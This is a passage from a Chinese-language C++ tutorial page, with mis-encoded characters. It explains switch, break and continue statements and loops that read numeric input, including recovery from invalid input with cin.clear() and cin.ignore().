class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™ç§åŸºäºå•ä¸ªæ•´æ•°å€¼çš„å¤šè·¯åˆ†æ”¯ï¼Œ<code>switch</code> é€šå¸¸è¢«è®¤ä¸ºæ›´æ¸…æ™°ã€æœ‰æ—¶æ•ˆç‡ä¹Ÿå¯èƒ½æ›´é«˜ï¼ˆç¼–è¯‘å™¨å¯èƒ½å°†å…¶ä¼˜åŒ–ä¸ºè·³è½¬è¡¨ï¼‰ã€‚ä½†å¯¹äºæ¶‰åŠèŒƒå›´æˆ–éæ•´æ•°ç±»å‹çš„åˆ¤æ–­ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ <code>if else if</code> ç»“æ„ã€‚</p><h2 id="6-6-break-å’Œ-continue-è¯­å¥"><a href="#6-6-break-å’Œ-continue-è¯­å¥" class="headerlink" title="6.6 break å’Œ continue è¯­å¥"></a>6.6 break å’Œ continue è¯­å¥</h2><p>C++ æä¾›äº†ä¸¤ä¸ªç‰¹æ®Šçš„è¯­å¥ï¼Œ<code>break</code> å’Œ <code>continue</code>ï¼Œç”¨äºåœ¨å¾ªç¯ï¼ˆ<code>for</code>, <code>while</code>, <code>do while</code>ï¼‰æˆ– <code>switch</code> è¯­å¥å†…éƒ¨æ”¹å˜æ­£å¸¸çš„æ‰§è¡Œæµç¨‹ã€‚</p><h3 id="6-6-1-break-è¯­å¥"><a href="#6-6-1-break-è¯­å¥" class="headerlink" title="6.6.1 break è¯­å¥"></a>6.6.1 break è¯­å¥</h3><p><code>break</code> è¯­å¥ç”¨äºç«‹å³ç»ˆæ­¢<strong>åŒ…å«å®ƒ</strong>çš„æœ€å†…å±‚çš„å¾ªç¯ï¼ˆ<code>for</code>, <code>while</code>, <code>do while</code>ï¼‰æˆ– <code>switch</code> è¯­å¥çš„æ‰§è¡Œã€‚ç¨‹åºæ§åˆ¶æµä¼šè·³è½¬åˆ°è¯¥å¾ªç¯æˆ– <code>switch</code> è¯­å¥ä¹‹åçš„ä¸‹ä¸€æ¡è¯­å¥ã€‚</p><p><strong>ç”¨æ³•:</strong></p><ul><li>  <strong>åœ¨å¾ªç¯ä¸­:</strong> å½“æ»¡è¶³æŸä¸ªç‰¹å®šæ¡ä»¶æ—¶ï¼Œæå‰é€€å‡ºå¾ªç¯ã€‚</li><li>  <strong>åœ¨ <code>switch</code> è¯­å¥ä¸­:</strong> é˜²æ­¢â€œè´¯ç©¿â€ï¼ˆfall-throughï¼‰åˆ°ä¸‹ä¸€ä¸ª <code>case</code>ï¼Œåœ¨æ‰§è¡Œå®ŒåŒ¹é…çš„ <code>case</code> ä»£ç å—åè·³å‡º <code>switch</code> ç»“æ„ï¼ˆå¦‚ 6.5 èŠ‚æ‰€è¿°ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹ (åœ¨å¾ªç¯ä¸­ä½¿ç”¨):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªè´Ÿæ•°çš„ä½ç½®</span></span><br><span class="line">    <span class="keyword">int</span> numbers[] = &#123;<span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">-2</span>, <span class="number">8</span>, <span class="number">-5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> found_index = <span class="number">-1</span>; <span class="comment">// åˆå§‹åŒ–ä¸º -1ï¼Œè¡¨ç¤ºæœªæ‰¾åˆ°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Searching for the first negative number...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; numbers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (numbers[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            found_index = i;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Negative number found at index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;. Breaking loop.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// æ‰¾åˆ°ç¬¬ä¸€ä¸ªè´Ÿæ•°ï¼Œç«‹å³è·³å‡º for å¾ªç¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found_index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The loop was terminated early.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No negative number found in the array.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤ºåœ¨åµŒå¥—å¾ªç¯ä¸­çš„ä½œç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nNested loop example:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">2</span> &amp;&amp; j == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Breaking inner loop at i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// åªè·³å‡ºå†…å±‚å¾ªç¯ (j å¾ªç¯)</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// break åï¼Œæ§åˆ¶æµä¼šåˆ°è¾¾è¿™é‡Œï¼Œç»§ç»­å¤–å±‚å¾ªç¯çš„ä¸‹ä¸€æ¬¡è¿­ä»£</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of inner loop for i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> ç¬¬ä¸€ä¸ªå¾ªç¯éå† <code>numbers</code> æ•°ç»„ã€‚å½“ <code>i</code> ä¸º 3 æ—¶ï¼Œ<code>numbers[3]</code> æ˜¯ -2ï¼Œæ»¡è¶³ <code>if</code> æ¡ä»¶ã€‚<code>found_index</code> è¢«è®¾ä¸º 3ï¼Œæ‰“å°æ¶ˆæ¯ï¼Œç„¶å <code>break</code> è¯­å¥è¢«æ‰§è¡Œï¼Œç«‹å³ç»ˆæ­¢ <code>for</code> å¾ªç¯ã€‚åé¢çš„å…ƒç´ ï¼ˆ8 å’Œ -5ï¼‰ä¸ä¼šè¢«æ£€æŸ¥ã€‚</li><li> åœ¨åµŒå¥—å¾ªç¯ç¤ºä¾‹ä¸­ï¼Œå½“ <code>i</code> ä¸º 2 ä¸” <code>j</code> ä¸º 2 æ—¶ï¼Œ<code>break</code> è¯­å¥æ‰§è¡Œã€‚å®ƒåªç»ˆæ­¢äº†æœ€å†…å±‚çš„ <code>j</code> å¾ªç¯ã€‚å¤–å±‚çš„ <code>i</code> å¾ªç¯ç»§ç»­æ‰§è¡Œå…¶ä¸‹ä¸€æ¬¡è¿­ä»£ï¼ˆå½“ <code>i</code> ä¸º 3 æ—¶ï¼‰ã€‚</li></ol><h3 id="6-6-2-continue-è¯­å¥"><a href="#6-6-2-continue-è¯­å¥" class="headerlink" title="6.6.2 continue è¯­å¥"></a>6.6.2 continue è¯­å¥</h3><p><code>continue</code> è¯­å¥ç”¨äºè·³è¿‡å½“å‰å¾ªç¯è¿­ä»£ä¸­<strong>å‰©ä½™</strong>çš„ä»£ç ï¼Œå¹¶ç«‹å³å¼€å§‹ä¸‹ä¸€æ¬¡è¿­ä»£ã€‚ä¸ <code>break</code> ä¸åŒï¼Œ<code>continue</code> ä¸ä¼šç»ˆæ­¢æ•´ä¸ªå¾ªç¯ã€‚</p><p><strong>ç”¨æ³•:</strong></p><ul><li>  <strong>åœ¨ <code>while</code> å’Œ <code>do while</code> å¾ªç¯ä¸­:</strong> æ§åˆ¶æµè·³è½¬åˆ°å¾ªç¯æ¡ä»¶çš„åˆ¤æ–­å¤„ã€‚</li><li>  <strong>åœ¨ <code>for</code> å¾ªç¯ä¸­:</strong> æ§åˆ¶æµé¦–å…ˆè·³è½¬åˆ° <code>for</code> å¾ªç¯çš„æ›´æ–°è¡¨è¾¾å¼ï¼ˆä¾‹å¦‚ <code>++i</code>ï¼‰ï¼Œç„¶åè·³è½¬åˆ°å¾ªç¯æ¡ä»¶çš„åˆ¤æ–­å¤„ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ‰“å° 1 åˆ° 10 ä¹‹é—´çš„å¥‡æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Odd numbers between 1 and 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœ i æ˜¯å¶æ•°</span></span><br><span class="line">            <span class="keyword">continue</span>;     <span class="comment">// è·³è¿‡æœ¬æ¬¡è¿­ä»£å‰©ä½™çš„éƒ¨åˆ† (cout è¯­å¥)ï¼Œç›´æ¥è¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£ (i++)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åªæœ‰å½“ i æ˜¯å¥‡æ•°æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œè¿™è¡Œä»£ç </span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 1 3 5 7 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ¼”ç¤ºåœ¨ while å¾ªç¯ä¸­</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSkipping number 5 in while loop (1 to 7):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; <span class="number">7</span>) &#123;</span><br><span class="line">        k++; <span class="comment">// å…ˆé€’å¢ k</span></span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Skipping 5) &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// è·³è¿‡æœ¬æ¬¡è¿­ä»£çš„ cout</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 1 2 3 4 (Skipping 5) 6 7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> åœ¨ <code>for</code> å¾ªç¯ä¸­ï¼Œå½“ <code>i</code> æ˜¯å¶æ•°æ—¶ï¼ˆ<code>i % 2 == 0</code> ä¸ºçœŸï¼‰ï¼Œ<code>continue</code> è¯­å¥æ‰§è¡Œã€‚å®ƒè·³è¿‡äº† <code>std::cout &lt;&lt; i &lt;&lt; &quot; &quot;;</code> è¿™è¡Œä»£ç ï¼Œç›´æ¥æ‰§è¡Œæ›´æ–°è¡¨è¾¾å¼ <code>++i</code>ï¼Œç„¶ååˆ¤æ–­å¾ªç¯æ¡ä»¶ <code>i &lt;= 10</code>ã€‚å› æ­¤ï¼Œåªæœ‰å¥‡æ•°è¢«æ‰“å°å‡ºæ¥ã€‚</li><li> åœ¨ <code>while</code> å¾ªç¯ä¸­ï¼Œå½“ <code>k</code> é€’å¢åˆ° 5 æ—¶ï¼Œ<code>if</code> æ¡ä»¶æ»¡è¶³ï¼Œ<code>continue</code> æ‰§è¡Œï¼Œè·³è¿‡äº† <code>std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;</code>ï¼Œç›´æ¥å›åˆ° <code>while (k &lt; 7)</code> çš„æ¡ä»¶åˆ¤æ–­ã€‚</li></ol><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>  <code>break</code>: å®Œå…¨<strong>ç»ˆæ­¢</strong>æœ€å†…å±‚çš„å¾ªç¯æˆ– <code>switch</code>ã€‚</li><li>  <code>continue</code>: <strong>è·³è¿‡</strong>å½“å‰å¾ªç¯è¿­ä»£çš„å‰©ä½™éƒ¨åˆ†ï¼Œè¿›å…¥<strong>ä¸‹ä¸€æ¬¡è¿­ä»£</strong>ï¼ˆå¦‚æœå¾ªç¯æ¡ä»¶å…è®¸ï¼‰ã€‚</li></ul><p>è¿™ä¸¤ä¸ªè¯­å¥å¯ä»¥ä½¿å¾ªç¯æ§åˆ¶æ›´åŠ çµæ´»ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šé™ä½ä»£ç çš„å¯è¯»æ€§ã€‚é€šå¸¸ï¼Œå¯ä»¥é€šè¿‡è°ƒæ•´å¾ªç¯æ¡ä»¶æˆ–ä½¿ç”¨ <code>if</code> è¯­å¥æ¥é¿å…ä¸€äº›ä¸å¿…è¦çš„ <code>break</code> æˆ– <code>continue</code>ã€‚</p><h2 id="6-7-è¯»å–æ•°å­—çš„å¾ªç¯"><a href="#6-7-è¯»å–æ•°å­—çš„å¾ªç¯" class="headerlink" title="6.7 è¯»å–æ•°å­—çš„å¾ªç¯"></a>6.7 è¯»å–æ•°å­—çš„å¾ªç¯</h2><p>åœ¨ C++ ç¨‹åºä¸­ï¼Œç»å¸¸éœ€è¦ç¼–å†™å¾ªç¯æ¥è¯»å–ç”¨æˆ·çš„æ•°å­—è¾“å…¥ï¼Œç›´åˆ°æ»¡è¶³æŸä¸ªæ¡ä»¶ï¼ˆä¾‹å¦‚è¾“å…¥ç‰¹å®šå€¼æˆ–é‡åˆ°æ— æ•ˆè¾“å…¥ï¼‰ä¸ºæ­¢ã€‚ç„¶è€Œï¼Œå¤„ç†æ•°å­—è¾“å…¥ï¼Œç‰¹åˆ«æ˜¯å¤„ç†æ½œåœ¨çš„é”™è¯¯è¾“å…¥ï¼Œéœ€è¦ä¸€äº›æŠ€å·§ã€‚</p><h3 id="åŸºæœ¬çš„æ•°å­—è¯»å–å¾ªç¯"><a href="#åŸºæœ¬çš„æ•°å­—è¯»å–å¾ªç¯" class="headerlink" title="åŸºæœ¬çš„æ•°å­—è¯»å–å¾ªç¯"></a>åŸºæœ¬çš„æ•°å­—è¯»å–å¾ªç¯</h3><p>ä¸€ä¸ªç®€å•çš„è¯»å–æ•°å­—å¹¶ç´¯åŠ çš„å¾ªç¯å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•è¯»å–ä¸€ä¸ªæ•´æ•°ï¼Œå¦‚æœæˆåŠŸï¼Œcin è¿”å› true</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">        sum += input_number;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next number: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å½“è¾“å…¥éæ•°å­—æ—¶ï¼Œå¾ªç¯ç»“æŸ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop terminated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å·¥ä½œæ–¹å¼:</strong></p><ol><li> <code>std::cin &gt;&gt; input_number</code> å°è¯•ä»è¾“å…¥æµä¸­è¯»å–ä¸€ä¸ªæ•´æ•°å¹¶å­˜å‚¨åˆ° <code>input_number</code> ä¸­ã€‚</li><li> è¿™ä¸ªè¡¨è¾¾å¼æœ¬èº«ä¼šè¿”å› <code>std::cin</code> å¯¹è±¡ã€‚åœ¨éœ€è¦å¸ƒå°”å€¼çš„ä¸Šä¸‹æ–‡ä¸­ï¼ˆå¦‚ <code>while</code> çš„æ¡ä»¶ï¼‰ï¼Œ<code>std::cin</code> å¯¹è±¡ä¼šæ ¹æ®æµçš„çŠ¶æ€è½¬æ¢ä¸º <code>true</code> æˆ– <code>false</code>ã€‚</li><li> å¦‚æœæˆåŠŸè¯»å–ä¸€ä¸ªæ•´æ•°ï¼ŒæµçŠ¶æ€æ˜¯æ­£å¸¸çš„ï¼Œ<code>std::cin</code> è½¬æ¢ä¸º <code>true</code>ï¼Œå¾ªç¯ä½“æ‰§è¡Œã€‚</li><li> å¦‚æœç”¨æˆ·è¾“å…¥äº†éæ•°å­—ï¼ˆä¾‹å¦‚è¾“å…¥ â€œhelloâ€ æˆ–æŒ‰ Ctrl+Z/Ctrl+D è¡¨ç¤ºæ–‡ä»¶ç»“æŸï¼‰ï¼Œ<code>std::cin &gt;&gt; input_number</code> ä¼šå¤±è´¥ã€‚æ­¤æ—¶ï¼Œ<code>std::cin</code> ä¼šè¿›å…¥â€œå¤±è´¥â€ï¼ˆfailï¼‰çŠ¶æ€ï¼Œè½¬æ¢ä¸º <code>false</code>ï¼Œå¾ªç¯ç»ˆæ­¢ã€‚</li></ol><h3 id="å¤„ç†é”™è¯¯è¾“å…¥"><a href="#å¤„ç†é”™è¯¯è¾“å…¥" class="headerlink" title="å¤„ç†é”™è¯¯è¾“å…¥"></a>å¤„ç†é”™è¯¯è¾“å…¥</h3><p>ä¸Šé¢çš„ç®€å•å¾ªç¯åœ¨é‡åˆ°éæ•°å­—è¾“å…¥æ—¶ä¼šç»ˆæ­¢ï¼Œä½†å®ƒæ²¡æœ‰æ˜ç¡®åœ°å¤„ç†é”™è¯¯çŠ¶æ€ã€‚å¦‚æœå¾ªç¯ç»“æŸåè¿˜éœ€è¦ç»§ç»­ä» <code>std::cin</code> è¯»å–å…¶ä»–ç±»å‹çš„è¾“å…¥ï¼Œå°±éœ€è¦æ¸…é™¤é”™è¯¯çŠ¶æ€å¹¶ä¸¢å¼ƒæ— æ•ˆçš„è¾“å…¥ã€‚</p><p><strong>é—®é¢˜:</strong> å½“ <code>std::cin &gt;&gt; input_number</code> å¤±è´¥æ—¶ï¼Œè¾“å…¥æµ <code>std::cin</code> ä¼šè®¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡å¿—ï¼ˆfailbitï¼‰ï¼Œå¹¶ä¸”å¯¼è‡´å¤±è´¥çš„è¾“å…¥ï¼ˆä¾‹å¦‚ â€œhelloâ€ï¼‰ä»ç„¶ç•™åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚å¦‚æœä¸å¤„ç†ï¼Œåç»­çš„ <code>std::cin</code> æ“ä½œé€šå¸¸ä¹Ÿä¼šç«‹å³å¤±è´¥ã€‚</p><p><strong>è§£å†³æ–¹æ¡ˆ:</strong></p><ol><li> <strong>æ¸…é™¤é”™è¯¯çŠ¶æ€:</strong> ä½¿ç”¨ <code>std::cin.clear()</code> æ–¹æ³•é‡ç½®æµçš„é”™è¯¯æ ‡å¿—ã€‚</li><li> <strong>å¿½ç•¥æ— æ•ˆè¾“å…¥:</strong> ä½¿ç”¨ <code>std::cin.ignore()</code> æ–¹æ³•ä¸¢å¼ƒè¾“å…¥ç¼“å†²åŒºä¸­ä¸éœ€è¦çš„å­—ç¬¦ã€‚é€šå¸¸ä¼šå¿½ç•¥ç›´åˆ°ä¸‹ä¸€ä¸ªæ¢è¡Œç¬¦ <code>\n</code> æˆ–è¾¾åˆ°æŸä¸ªæœ€å¤§å­—ç¬¦æ•°ã€‚</li></ol><p><strong>ç¤ºä¾‹ (æ›´å¥å£®çš„æ•°å­—è¯»å–å¾ªç¯):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // éœ€è¦åŒ…å« &lt;limits&gt; æ¥ä½¿ç”¨ numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// ä½¿ç”¨æ— é™å¾ªç¯ï¼Œå†…éƒ¨å¤„ç†é€€å‡ºæ¡ä»¶</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">            <span class="comment">// æˆåŠŸè¯»å–æ•°å­—</span></span><br><span class="line">            sum += input_number;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span 